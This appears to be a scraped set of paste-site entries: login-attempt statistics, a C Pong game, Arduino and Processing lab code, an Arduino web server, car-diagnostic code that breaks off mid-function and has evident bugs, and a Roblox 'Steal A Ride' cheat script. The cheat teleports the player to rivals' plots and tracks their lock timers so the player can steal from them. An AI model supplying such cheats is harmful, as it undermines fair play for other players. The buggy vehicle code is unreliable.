    ""Limited Network LTD"": 2,
    ""Unknown"": 3,
    ""Valence Technology Co"": 10,
    ""HostSlick"": 2,
    ""netcup GmbH"": 1,
    ""10x Servers"": 2,
    ""Censys Inc"": 1,
    ""MTN Nigeria"": 1
  },
  ""regionName"": {
    ""Western Cape"": 1,
    ""Mazovia"": 1,
    ""Hesse"": 220,
    ""\u00cele-de-France"": 5,
    ""California"": 17,
    ""England"": 1,
    ""Federal District"": 2,
    ""Veliko Tarnovo"": 1,
    ""North Holland"": 10,
    ""New Jersey"": 1,
    ""Bavaria"": 2,
    ""East Java"": 2,
    ""South West"": 2,
    ""Baden-Wurttemberg"": 1,
    ""Virginia"": 2,
    ""Michigan"": 1,
    ""Lagos"": 1
  },
  ""country"": {
    ""South Africa"": 1,
    ""Poland"": 1,
    ""Germany"": 223,
    ""France"": 5,
    ""United States"": 21,
    ""United Kingdom"": 1,
    ""Brazil"": 2,
    ""Bulgaria"": 1,
    ""The Netherlands"": 10,
    ""Indonesia"": 2,
    ""Singapore"": 2,
    ""Nigeria"": 1
  },
  ""account"": {
    ""hello"": 235,
    ""Administr"": 1,
    ""(empty)"": 2,
    ""ObtrTMCXG"": 1,
    ""uteKUF"": 1,
    ""JCjKGS"": 1,
    ""Test"": 4,
    ""eltons"": 5,
    ""administr"": 5,
    ""EMqOWepal"": 1,
    ""xScuQB"": 1,
    ""AURLoF"": 1,
    ""AfviyoJQu"": 1,
    ""kiXpdU"": 1,
    ""UkDsQW"": 1,
    ""142.93.8.59"": 1,
    ""cxda14mx"": 4,
    ""beio"": 1,
    ""wUSJgMgnC"": 1,
    ""aDDBnX"": 1,
    ""UHcJfp"": 1
  },
  ""keyboard"": {
    ""Unknown"": 270
  },
  ""client_build"": {
    ""Unknown"": 270
  },
  ""client_name"": {
    ""Unknown"": 270
  },
  ""ip_type"": {
    ""Unknown"": 19,
    ""hosting"": 244,
    ""proxy"": 4,
    ""hosting & proxy"": 2,
    ""mobile & hosting"": 1
  }
}"
XiUby7sn,Pong,Kienan,C,Friday 11th of July 2025 06:26:59 PM CDT,"#include <stdio.h>
#include <stdbool.h> // TODO: Если нельзя юзать либу для bool типов, то вместо них используй int, где 0 - false, 1 - true
#include <unistd.h>

#define WIDTH 80
#define HEIGHT 24
#define PADDLE_HEIGHT 3
#define LOOP_UPDATE_MS 100000
#define POINTS_PER_HIT 1

// TODO: Если нельзя юзать структуры, то переделайте просто на обычные int переменые
typedef struct {
    int position_x, position_y;
    int velocity_x, velocity_y;
} Ball;

typedef struct {
    int y;
} Paddle;

typedef struct {
    bool is_playing;
    int score;
} GameStatus;

void clear_screen() {
    printf(""\033[2J\033[H""); // TODO: написать логику очистки консоли, хз сработает ли эта реализация
}

void draw_game(const Ball ball, const Paddle left_paddle, const Paddle right_paddle) {
    clear_screen();

    for (int x = 0; x < WIDTH + 2; x++) printf(""#"");
    printf(""\n"");

    for (int y = 0; y < HEIGHT; y++) {
        printf(""#""); // Left border

        for (int x = 0; x < WIDTH; x++) {
            // Draw ball
            if (x == ball.position_x && y == ball.position_y) {
                printf(""O"");
            }
            // Draw paddles
            else if ((x == 0 && (y >= left_paddle.y && y < left_paddle.y + PADDLE_HEIGHT)) ||
                     (x == WIDTH - 1 && (y >= right_paddle.y && y < right_paddle.y + PADDLE_HEIGHT))) {
                printf(""|"");
            } else {
                printf("" "");
            }
        }

        printf(""#\n""); // Right border
    }

    // Draw bottom border
    for (int x = 0; x < WIDTH + 2; x++)
        printf(""#"");

    printf(""\n"");
}

void check_paddle_collision(Ball *ball, const Paddle *paddle, GameStatus *status) {
    bool is_ball_hit_paddle = ball->position_y <= paddle->y + PADDLE_HEIGHT && ball->position_y >= paddle->y;
    if (!is_ball_hit_paddle) {
        status->is_playing = false;
    } else {
        status->score += POINTS_PER_HIT;
        ball->velocity_x *= -1;
    }
}

void simulate_game(Ball *ball, const Paddle *left_paddle, const Paddle *right_paddle, GameStatus *status) {
    // двигаем мяч
    ball->position_x += ball->velocity_x;
    ball->position_y += ball->velocity_y;

    // просчет ударов об верхние границы
    if (ball->position_y <= 0 || ball->position_y >= HEIGHT - 1)
        ball->velocity_y *= -1;

    // просчет ударов об боковые границы или об платформы.
    if (ball->position_x <= 0)
        check_paddle_collision(ball, left_paddle, status);
    else if (ball->position_x >= WIDTH - 1)
        check_paddle_collision(ball, right_paddle, status);
}

int clamp(int value, int min_value, int max_value) {
    if (value > max_value)
        return max_value;

    if (value < min_value)
        return min_value;

    return value;
}

// TODO: написать логику инпута. где 1 = движение вверх; -1 = вниз; 0 = бездействие;
// left_paddle_input - инпут для левой платформы
// right_paddle_input - инпут для правой платформы
void update_input(Paddle *left_paddle, Paddle *right_paddle) {
    int left_paddle_input = 0; // 1 = up; -1 = down; 0 = no input;
    int max_pos = HEIGHT - PADDLE_HEIGHT;
    left_paddle->y = clamp(left_paddle->y + left_paddle_input, 0, max_pos);

    int right_paddle_input = -1;
    right_paddle->y = clamp(right_paddle->y + right_paddle_input, 0, max_pos);
}

void draw_score(const GameStatus *game_status) {
    printf(""\nGame End"");
    printf(""Score: %d\n"", game_status->score);
}

int main() {
    Ball ball = {WIDTH / 2, HEIGHT / 2, 1, 1};
    Paddle left_paddle = {HEIGHT / 2 - 1};
    Paddle right_paddle = {HEIGHT / 2 - 1};
    GameStatus game_status = {true, 0};

    while (game_status.is_playing) {
        update_input(&left_paddle, &right_paddle);
        simulate_game(&ball, &left_paddle, &right_paddle, &game_status);
        draw_game(ball, left_paddle, right_paddle);
        usleep(LOOP_UPDATE_MS);
    }

    draw_score(&game_status);

    return 0;
}
"
BPUXgjw3,Lab final XML,CrhisDLM,XML,Friday 11th of July 2025 06:15:07 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
<paquete>
	<image presionado=""si"">1.png</image>
	<image presionado=""si"">2.png</image>
	<image presionado=""si"">5.png</image>
	<image presionado=""si"">6.png</image>
	<image presionado=""si"">8.png</image>
	<image presionado=""si"">9.png</image>
	<image presionado=""no"">3.png</image>
	<image presionado=""no"">4.png</image>
	<image presionado=""no"">7.png</image>
	<image presionado=""no"">circulo.png</image>
	<image presionado=""no"">http://filoymer.files.wordpress.com/2008/12/triangulos_amarillo.png</image>
	<image presionado=""no"">cuadrado_verde.png</image>
	<image presionado=""no"">rectangulo_blanco.jpg</image>
 
	<!--- Mas Imagenes, las que quiera-->
 
</paquete>"
s8hWtM02,Lab Final Processing,CrhisDLM,Java,Friday 11th of July 2025 06:13:37 PM CDT,"// Example by Tom Igoe

import processing.serial.*;

Serial serial; // The serial port
PFont myFont; // The display font
String inString=""""; // Input string from serial port
int lf = 10; // ASCII linefeed
PImage img;
Juego n;
int timeI=0;
boolean presionar=false;
int veces=0;
int prsionar=0;
void setup() {
  size(700, 400);
  // You'll need to make this font with the Create Font Tool
  // myFont = loadFont(""ArialMS-18.vlw"");
  //textFont(myFont, 18);
  // List all the available serial ports:
  println(Serial.list());
  // I know that the first port in the serial list on my mac
  // is always my Keyspan adaptor, so I open Serial.list()[0].
  // Open whatever port is the one you're using.


  serial = new Serial(this, Serial.list()[0], 9600);
  // myPort.bufferUntil(lf);
  n = new Juego();
  timeI=2000;
}

void draw() {

  background(0);


  n.iniciar();

  if (img!=null)
    image(img, 490, 100, 200, 200);
  if (presionar) {
    fill(0, 255, 0);
    prsionar++;
  } else {
    fill(255, 0, 0);
  }
  ellipse(100, 200, 200, 200);

  delay(1000);
  if (inString.length()>0)
    veces++;
  text(""Tiempo Del Anterior: "" + inString+"" "", 10, 70);
  inString="""";
  serial.write('c');
  serial.write('b');
  inString="""";
  timeI=0;
}

void serialEvent(Serial p) {


  inString += """"+p.readString();
  delay(2);
}

class Juego {
  XML xml;
  int cont=0;
  public Imags[] imagenes;
  public Juego() {

    xml = loadXML(""imags.xml"");
    XML[] children = xml.getChildren(""image"");
    imagenes=new Imags[children.length];
    for (int i = 0; i < children.length; i++) {

      String siono = children[i].getString(""presionado"");
      String name = children[i].getContent();
      imagenes[i]=new Imags(name, siono);
    }
  }
  void iniciar() {

    if (cont>=imagenes.length) {
      if (veces==prsionar) {
        println(""Acertaste en todos"");
        veces=0;
        prsionar=0;
      }
      cont=0;
    }
    img=loadImage(imagenes[cont].darImage());
    presionar=imagenes[cont].estaPresionado();
    if (timeI!=0)
      delay(timeI);

    serial.write('a');
    cont++;
  }
}
class Imags {
  public String imagenes="""";
  public String presionado="""";
  public Imags(String nimag, String f) {
    imagenes=nimag;
    presionado=f;
  }

  public boolean estaPresionado() {
    if (presionado.equals(""si""))
      return true;
    else
      return false;
  }

  public String darImage() {
    return imagenes;
  }
}"
KfqtFQbU,Lab Final Arduino,CrhisDLM,C++,Friday 11th of July 2025 06:07:44 PM CDT,"int in = 2;

void setup() {
  Serial.begin(9600);
  pinMode(in, INPUT);

}
int temi = 0;
int tfin = 0;
boolean alto = false;
void loop() {

}


void serialEvent() {
  if (Serial.read() == 'a') {
    temi = millis();
    while (digitalRead(in) == LOW && Serial.read() != 'c') {
      alto = true;
      tfin = millis();

    }

    if (digitalRead(in) == HIGH && alto) {
      int res = tfin - temi;
      Serial.println(res);
      alto = false;

    }
    temi = 0;
    tfin = 0;
  }
  if (Serial.read() == 'b') {
    temi = 0;
    tfin = 0;
  }
}"
0e2MWQ1Z,Laboratorio 12,CrhisDLM,C++,Friday 11th of July 2025 05:55:49 PM CDT,"/*
  Web Server

  A simple web server that shows the value of the analog input pins.
  using an Arduino Wiznet Ethernet shield.

  Circuit:
   Ethernet shield attached to pins 10, 11, 12, 13
   Analog inputs attached to pins A0 through A5 (optional)

  created 18 Dec 2009
  by David A. Mellis
  modified 9 Apr 2012
  by Tom Igoe
  modified 02 Sept 2015
  by Arturo Guadalupi

*/

#include <SPI.h>
#include <Ethernet.h>
#include <LiquidCrystal.h>
// Enter a MAC address and IP address for your controller below.
// The IP address will be dependent on your local network:
byte mac[] = {
  0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED
};
IPAddress ip(192, 168, 1, 177);

// Initialize the Ethernet server library
// with the IP address and port you want to use
// (port 80 is default for HTTP):
EthernetServer server(80);
LiquidCrystal lcd(9, 8, 5, 7, 3, 2);
String text = """";
void setup() {
  // Open serial communications and wait for port to open:
  Serial.begin(9600);
  lcd.begin(16, 2);
  while (!Serial) {
    ; // wait for serial port to connect. Needed for native USB port only
  }


  // start the Ethernet connection and the server:
  Ethernet.begin(mac, ip);
  server.begin();
  lcd.setCursor(0, 0);

  lcd.print(""Hola!"");
  Serial.print(""server is at "");
  Serial.println(Ethernet.localIP());
}


void loop() {
  // listen for incoming clients
  EthernetClient client = server.available();
  if (client) {
    Serial.println(""new client"");
    // an http request ends with a blank line
    boolean currentLineIsBlank = true;
    while (client.connected()) {
      if (client.available()) {
        char c = client.read();
        Serial.write(c);
        // if you've gotten to the end of the line (received a newline
        // character) and the line is blank, the http request has ended,
        // so you can send a reply
        if (c == '\n' && currentLineIsBlank) {
          // send a standard http response header
          client.println(""HTTP/1.1 200 OK"");
          client.println(""Content-Type: text/html"");
          client.println(""Connection: close"");  // the connection will be closed after completion of the response
          //client.println(""Refresh: 5"");  // refresh the page automatically every 5 sec
          client.println();
          client.println(""<!DOCTYPE HTML>"");
          client.println(""<html><body style=\""background: #14682E linear-gradient(90deg,rgba(20, 104, 46, 1) 0%, rgba(237, 221, 83, 1) 100%);\""><script></script>"");
          // output the value of each analog input pin
          client.print(""<form>"");
          client.print(""<input style=\""font-size: 24px;\"" name=\""msj\"" autofocus/>"");
          client.print(""<input style=\""font-size: 24px;\"" type=\""submit\""/>"");
          client.print(""</form>"");
          client.print(""</body>"");
          client.println(""</html>"");
          break;
        }
        if (c == 'G') {
          lcd.clear();
          lcd.setCursor(0, 0);
          lcd.print(""Mensaje:"");
          lcd.setCursor(0, 1);
          Serial.println(""Peticion Detectada"");
          String peticion = getString(client);
          if (peticion.indexOf(""msj"") != -1) {
            int posi = peticion.indexOf(""="");
            int posf = peticion.indexOf(""HTTP"");
            if (posf == -1)
              text = peticion.substring(posi + 1);
            else
              text = peticion.substring(posi + 1, posf);
            Serial.println(text);
            client.flush(); // limpia el resto del contenido de la peticion
          }

          lcd.print(text);
          Serial.println(text);
        }
        if (c == '\n') {
          // you're starting a new line
          currentLineIsBlank = true;
        } else if (c != '\r') {
          // you've gotten a character on the current line
          currentLineIsBlank = false;
        }
      }
    }
    // give the web browser time to receive the data
    delay(1);
    // close the connection:
    client.stop();
    Serial.println(""client disconnected"");
  }
}
String getString(EthernetClient client) {
  char s = client.read();
  String p = """";
  unsigned long timeout = millis();
  while (s != '\n' && ((millis() - timeout) < 10000)) {
    p += s;
    s = client.read();
  }
  return p;
}"
mmjCG0Gg,Steal A Ride Roblox Script 2025,BluezModZ,Lua,Friday 11th of July 2025 05:47:22 PM CDT,"-- Made By RE70-DECEMBER 
--AI Generated Ai is taking over the world :(

local player = game.Players.LocalPlayer
local displayName = player.DisplayName
local plotsFolder = workspace:WaitForChild(""Plots"")

local myPlot = nil

-- Find your plot
for i = 1, 8 do
    local plot = plotsFolder:FindFirstChild(""Plot"" .. i)
    if plot then
        local ownerDisplay = plot:FindFirstChild(""OwnerDisplay"")
        if ownerDisplay then
            local textLabel = ownerDisplay:FindFirstChild(""TextLabel"")
            if textLabel and textLabel:IsA(""TextLabel"") then
                local labelText = textLabel.Text
                local usernamePart = string.match(labelText, ""^(.-)'s Garage$"")
                if usernamePart and usernamePart == displayName then
                    myPlot = plot
                    print(""✅ Found your plot:"", plot.Name)
                    break
                end
            end
        end
    end
end

if not myPlot then
    warn(""Plot not found!"")
    return
end

-- Create GUI
local ScreenGui = Instance.new(""ScreenGui"", player:WaitForChild(""PlayerGui""))
ScreenGui.Name = ""TeleportGui""
ScreenGui.ResetOnSpawn = false -- Keep GUI after death

-- Function to create styled buttons/labels
local function createStyledTextElement(isButton, text, position)
    local element
    if isButton then
        element = Instance.new(""TextButton"")
    else
        element = Instance.new(""TextLabel"")
    end
    element.Size = UDim2.new(0, 220, 0, 45)
    element.Position = position
    element.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    element.BorderSizePixel = 0
    element.TextColor3 = Color3.fromRGB(255, 255, 255)
    element.Font = Enum.Font.GothamBold
    element.TextSize = 18
    element.Text = text
    element.Parent = ScreenGui

    local corner = Instance.new(""UICorner"")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = element

    return element
end

-- Function to create minimize/maximize toggle buttons
local function createMinimizeButton(position, targetFrame)
    local btn = Instance.new(""TextButton"")
    btn.Size = UDim2.new(0, 40, 0, 30)
    btn.Position = position
    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 22
    btn.Text = ""−""
    btn.Parent = ScreenGui
    Instance.new(""UICorner"", btn).CornerRadius = UDim.new(0, 6)

    btn.MouseButton1Click:Connect(function()
        if targetFrame.Visible then
            targetFrame.Visible = false
            btn.Text = ""+""
        else
            targetFrame.Visible = true
            btn.Text = ""−""
        end
    end)

    return btn
end

-- Teleport to Base Button
local telButton = createStyledTextElement(true, ""Teleport to Base"", UDim2.new(0.05, 0, 0.1, 0))
telButton.TextColor3 = Color3.fromRGB(0, 255, 0)

-- LockTimer Display Label
local lockTimerLabel = createStyledTextElement(false, ""LockTimer: Loading..."", UDim2.new(0.05, 0, 0.2, 0))

-- Players Nearby Label
local playersNearLabel = createStyledTextElement(false, ""Players Nearby: Loading..."", UDim2.new(0.05, 0, 0.3, 0))

-- ScrollingFrame for players nearby (right side, upper)
local playerNamesFrame = Instance.new(""ScrollingFrame"")
playerNamesFrame.Size = UDim2.new(0, 180, 0, 250)
playerNamesFrame.Position = UDim2.new(1, -190, 0.1, 0)
playerNamesFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
playerNamesFrame.BorderSizePixel = 0
playerNamesFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
playerNamesFrame.ScrollBarThickness = 8
playerNamesFrame.Parent = ScreenGui
Instance.new(""UICorner"", playerNamesFrame).CornerRadius = UDim.new(0, 12)

local uiListLayout = Instance.new(""UIListLayout"", playerNamesFrame)
uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
uiListLayout.Padding = UDim.new(0, 6)

local uiPadding = Instance.new(""UIPadding"", playerNamesFrame)
uiPadding.PaddingTop = UDim.new(0, 6)
uiPadding.PaddingBottom = UDim.new(0, 6)
uiPadding.PaddingLeft = UDim.new(0, 6)
uiPadding.PaddingRight = UDim.new(0, 6)

-- Minimize button for nearby players list (above it)
local minimizeNearbyBtn = createMinimizeButton(UDim2.new(1, -190, 0.05, 0), playerNamesFrame)

-- ScrollingFrame for players NOT near base (right side, lower)
local playersFarFrame = Instance.new(""ScrollingFrame"", ScreenGui)
playersFarFrame.Size = UDim2.new(0, 240, 0, 300)
playersFarFrame.Position = UDim2.new(0, 10, 0.55, 0)
playersFarFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
playersFarFrame.ScrollBarThickness = 6
playersFarFrame.BorderSizePixel = 0
Instance.new(""UICorner"", playersFarFrame).CornerRadius = UDim.new(0, 8)

local uiListLayout2 = Instance.new(""UIListLayout"", playersFarFrame)
uiListLayout2.Padding = UDim.new(0, 4)

local header = Instance.new(""TextLabel"")
header.Size = UDim2.new(0, 240, 0, 40)
header.Position = UDim2.new(0, 10, 0.45, 0)
header.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
header.TextColor3 = Color3.fromRGB(255, 255, 255)
header.TextSize = 18
header.Font = Enum.Font.GothamBold
header.Text = ""Players Not Near Plots""
header.Parent = ScreenGui
Instance.new(""UICorner"", header).CornerRadius = UDim.new(0, 8)

-- Minimize button for players NOT near base list (above header)
local minimizeFarBtn = createMinimizeButton(UDim2.new(0, 10, 0.42, 0), playersFarFrame)

-- Teleport to CollectArea/Stand function for base button
telButton.MouseButton1Click:Connect(function()
    local collectArea = myPlot:FindFirstChild(""CollectArea"")
    if collectArea then
        local standPart = collectArea:FindFirstChild(""Stand"")
        if standPart and standPart:IsA(""BasePart"") then
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoidRootPart = character:WaitForChild(""HumanoidRootPart"")
            humanoidRootPart.CFrame = standPart.CFrame
            print(""Teleported to CollectArea/Stand!"")
        else
            warn(""Stand part not found inside CollectArea!"")
        end
    else
        warn(""CollectArea folder not found in your plot!"")
    end
end)

-- Update LockTimer every second
task.spawn(function()
    while true do
        local lockTimer = myPlot:FindFirstChild(""LockTimer"")
        if lockTimer then
            local timerText = """"
            local timeValue = nil
            
            if lockTimer:IsA(""NumberValue"") or lockTimer:IsA(""IntValue"") or lockTimer:IsA(""StringValue"") then
                timerText = tostring(lockTimer.Value)
                timeValue = tonumber(lockTimer.Value)
            elseif lockTimer:IsA(""TextLabel"") then
                timerText = tostring(lockTimer.Text)
                timeValue = tonumber(lockTimer.Text)
            else
                timerText = ""Found ("" .. lockTimer.ClassName .. "")""
            end

            lockTimerLabel.Text = ""LockTimer: "" .. timerText
            
            -- Color code based on time
            if timeValue then
                if timeValue > 30 then
                    lockTimerLabel.TextColor3 = Color3.fromRGB(0, 255, 0) -- Green
                elseif timeValue > 10 then
                    lockTimerLabel.TextColor3 = Color3.fromRGB(255, 255, 0) -- Yellow
                else
                    lockTimerLabel.TextColor3 = Color3.fromRGB(255, 0, 0) -- Red
                end
            else
                lockTimerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            end
        else
            lockTimerLabel.Text = ""LockTimer: N/A""
            lockTimerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
        end
        task.wait(1)
    end
end)

-- Update Players Nearby and List every second
task.spawn(function()
    while true do
        local count = 0
        local stealArea = myPlot:FindFirstChild(""StealArea"")
        local playersFound = {}

        if stealArea and stealArea:IsA(""BasePart"") then
            local size = stealArea.Size * 1.5 -- bigger range
            local position = stealArea.Position
            local region = Region3.new(position - (size / 2), position + (size / 2))
            region = region:ExpandToGrid(4)

            local partsInRegion = workspace:FindPartsInRegion3(region, nil, math.huge)

            for _, part in pairs(partsInRegion) do
                local char = part:FindFirstAncestorOfClass(""Model"")
                if char and char:FindFirstChild(""Humanoid"") and char ~= player.Character then
                    local plr = game.Players:GetPlayerFromCharacter(char)
                    if plr and not playersFound[plr] then
                        playersFound[plr] = true
                        count += 1
                    end
                end
            end

            playersNearLabel.Text = ""Players Nearby: "" .. tostring(count)

            -- Clear previous buttons
            for _, child in pairs(playerNamesFrame:GetChildren()) do
                if child:IsA(""TextButton"") then
                    child:Destroy()
                end
            end

            -- Add buttons for each player found nearby
            for plr, _ in pairs(playersFound) do
                local nameButton = Instance.new(""TextButton"")
                nameButton.Size = UDim2.new(1, 0, 0, 35)
                nameButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
                nameButton.TextColor3 = Color3.fromRGB(255, 255, 255)
                nameButton.Font = Enum.Font.Gotham
                nameButton.TextSize = 18
                nameButton.Text = plr.DisplayName
                nameButton.TextXAlignment = Enum.TextXAlignment.Left
                nameButton.Parent = playerNamesFrame

                local corner = Instance.new(""UICorner"")
                corner.CornerRadius = UDim.new(0, 8)
                corner.Parent = nameButton

                nameButton.MouseButton1Click:Connect(function()
                    local targetChar = plr.Character
                    if targetChar then
                        local targetHRP = targetChar:FindFirstChild(""HumanoidRootPart"")
                        if targetHRP then
                            local character = player.Character or player.CharacterAdded:Wait()
                            local humanoidRootPart = character:WaitForChild(""HumanoidRootPart"")
                            humanoidRootPart.CFrame = targetHRP.CFrame + Vector3.new(0, 3, 0)
                            print(""Teleported to player: "" .. plr.DisplayName)
                        else
                            warn(""Target player's HumanoidRootPart not found!"")
                        end
                    else
                        warn(""Target player's character not found!"")
                    end
                end)
            end

            -- Adjust canvas size for scrolling
            local layout = playerNamesFrame:FindFirstChildOfClass(""UIListLayout"")
            if layout then
                playerNamesFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 12)
            end

        else
            playersNearLabel.Text = ""StealArea not found!""
            -- Clear buttons if stealArea not found
            for _, child in pairs(playerNamesFrame:GetChildren()) do
                if child:IsA(""TextButton"") then
                    child:Destroy()
                end
            end
        end

        task.wait(1)
    end
end)

-- Update Players NOT Near Base every 2 seconds
task.spawn(function()
    while true do
        -- Clear old buttons
        for _, child in ipairs(playersFarFrame:GetChildren()) do
            if child:IsA(""TextButton"") then
                child:Destroy()
            end
        end

        for _, plr in ipairs(game.Players:GetPlayers()) do
            if plr ~= player and plr.Character and plr.Character:FindFirstChild(""HumanoidRootPart"") then
                local isNearOwnPlot = false
                local charPos = plr.Character.HumanoidRootPart.Position
                local minDistance = math.huge

                for i = 1, 8 do
                    local plot = plotsFolder:FindFirstChild(""Plot"" .. i)
                    if plot then
                        local ownerDisplay = plot:FindFirstChild(""OwnerDisplay"")
                        if ownerDisplay then
                            local textLabel = ownerDisplay:FindFirstChild(""TextLabel"")
                            if textLabel and textLabel:IsA(""TextLabel"") then
                                local usernamePart = string.match(textLabel.Text, ""^(.-)'s Garage$"")
                                if usernamePart and string.lower(usernamePart) == string.lower(plr.DisplayName) then
                                    local stealArea = plot:FindFirstChild(""StealArea"")
                                    if stealArea and stealArea:IsA(""BasePart"") then
                                        local pos = stealArea.Position
                                        local halfSize = stealArea.Size / 2
                                        local diff = charPos - pos
                                        if math.abs(diff.X) <= halfSize.X and math.abs(diff.Y) <= halfSize.Y and math.abs(diff.Z) <= halfSize.Z then
                                            isNearOwnPlot = true
                                            break
                                        else
                                            local dist = (charPos - pos).Magnitude
                                            if dist < minDistance then
                                                minDistance = dist
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end

                if not isNearOwnPlot and minDistance < math.huge then
                    local btn = Instance.new(""TextButton"")
                    btn.Size = UDim2.new(1, 0, 0, 35)
                    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
                    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
                    btn.Font = Enum.Font.Gotham
                    btn.TextSize = 16
                    btn.Text = plr.DisplayName .. "" - "" .. math.floor(minDistance) .. ""m""
                    btn.Parent = playersFarFrame
                    Instance.new(""UICorner"", btn).CornerRadius = UDim.new(0, 6)

                    btn.MouseButton1Click:Connect(function()
                        for i = 1, 8 do
                            local plot = plotsFolder:FindFirstChild(""Plot"" .. i)
                            if plot then
                                local ownerDisplay = plot:FindFirstChild(""OwnerDisplay"")
                                if ownerDisplay then
                                    local textLabel = ownerDisplay:FindFirstChild(""TextLabel"")
                                    if textLabel and string.match(textLabel.Text, ""^(.-)'s Garage$"") == plr.DisplayName then
                                        local collectArea = plot:FindFirstChild(""CollectArea"")
                                        if collectArea then
                                            local stand = collectArea:FindFirstChild(""Stand"")
                                            if stand and stand:IsA(""BasePart"") then
                                                local char = player.Character or player.CharacterAdded:Wait()
                                                local hrp = char:WaitForChild(""HumanoidRootPart"")
                                                hrp.CFrame = stand.CFrame + Vector3.new(0, 3, 0)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end)
                end
            end
        end

        playersFarFrame.CanvasSize = UDim2.new(0, 0, 0, uiListLayout2.AbsoluteContentSize.Y + 10)
        task.wait(2)
    end
end)
"
i3MQt3su,Vehicle Data rev_21,pleasedontcode,Arduino,Friday 11th of July 2025 05:35:01 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Vehicle Data
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 22:33:52

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data from bluetooth to android */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <SoftwareSerial.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp); // Added prototype for T_interpolate function

/***** DEFINITION OF Software Serial *****/
const uint8_t HC05_Bluetooth_TX_PIN = A0; // Bluetooth TX pin connected to Arduino A0
const uint8_t HC05_Bluetooth_RX_PIN = A1; // Bluetooth RX pin connected to Arduino A1
SoftwareSerial HC05(BT_TX_PIN, BT_RX_PIN); // Instantiate Bluetooth serial

// Define other variables used in the code
bool SilenceFound = false;
unsigned long StartTime = 0;
bool PreambleFound = false;
unsigned long PreambleTimer = 0;
byte ALDLbyte = 0;
const int ByteCount = 64; // Total bytes in data packet
int DataStreamIndex = 0;
unsigned int CheckTotal = 0;
byte DataBytes[65]; // Data buffer
byte Preamble[3] = {0x80, 0x95, 0x01}; // Preamble sequence
int i = 0;
int CheckSum = 0;
float RPM, TPS, MAF, BLM, INTEGRATOR, InjPW, O2mv, MAT, Runtime;
const int HexDataOutputPin = 4; // Pin for hex output flag
int linecount = 32; // For hex output formatting
int bytecounter = 0;
int linecount = 32; // For hex output formatting
byte M1Cmd[4] = {0x80, 0x95, 0x01, 0x00}; // Example command, replace with actual command if needed

void setup(void)
{
    // Initialize Bluetooth serial
    HC05.begin(9600);
    // Initialize serial communication for debugging
    Serial.begin(115200);
    // Set pin modes
    pinMode(4, INPUT_PULLUP); // Assuming active low for hex output flag
}

void loop(void)
{
    // Wait for silence period on the ALDL
    Serial.print(""wait for silence "");
    SilenceFound = false; // Reset silence flag
    StartTime= micros(); // First look for an active signal or a timeout - initialize timer
    // Should exit this loop on the start of a bit
    while ((micros() - StartTime) < 15000) // Wait for a 15 ms silent period
    {
        if (digitalRead(4) == 0) // Any line activity resets the start time
        {
            StartTime= micros(); // Timing starts over
        }
    }
    SilenceFound = true; // Set the silence flag on exit

    while (SilenceFound == true) // While silence found flag is set, continuously request and transmit Mode 1 data
    {
        PreambleFound = false; // Reset preamble found flag

        while (PreambleFound == false) // Look for preamble
        {
            Serial.print("" M1 cmd "");
            i=0; // use bytecounter to send the outgoing Mode1CMD sequence
            while (i<4)
            {
                Serial1.write(M1Cmd[i]); // Send command bytes
                i++;
            }
            Serial.println("" Finding Preamble "");
            i=0; // Reset byte counter
            PreambleTimer = millis(); // Initialize timer
            while ((((millis() - PreambleTimer) < 100)) && (PreambleFound == false))
            {
                if (Serial1.available() > 0)
                {
                    ALDLbyte = Serial1.read();
                    if (ALDLbyte == Preamble[i])
                    {
                        i++;
                        if (i > 2) PreambleFound = true;
                    }
                    else
                    {
                        PreambleFound = false;
                        i=0;
                    }
                }
            }
        }

        // Read data packet
        DataStreamIndex = 1;
        while (DataStreamIndex < 65)
        {
            if (Serial1.available() > 0)
            {
                DataBytes[DataStreamIndex] = Serial1.read();
                DataStreamIndex++;
            }
        }

        // Calculate checksum
        i=1;
        CheckTotal = 0x80+0x95+0x01; // Sum preamble bytes
        while (i < ByteCount)
        {
            CheckTotal += DataBytes[i];
            i++;
        }
        CheckSum = 0x200 - CheckTotal;

        // Verify checksum
        if (CheckSum == DataBytes[ByteCount])
        {
            // Prepare data string to send via Bluetooth
            String dataString = """";
            dataString += ""RPM: "";
            dataString += String((int)(DataBytes[11] * 25));
            dataString += "", TPS: "";
            dataString += String(DataBytes[10] * 0.019608);
            dataString += "", MAF: "";
            dataString += String(((DataBytes[36] * 256) + DataBytes[37]) * 0.003906);
            dataString += "", BLM: "";
            dataString += String(DataBytes[20]);
            dataString += "", BLCELL: "";
            dataString += String(DataBytes[21]);
            dataString += "", INTEGRATOR: "";
            dataString += String(DataBytes[22]);
            dataString += "", InjPW: "";
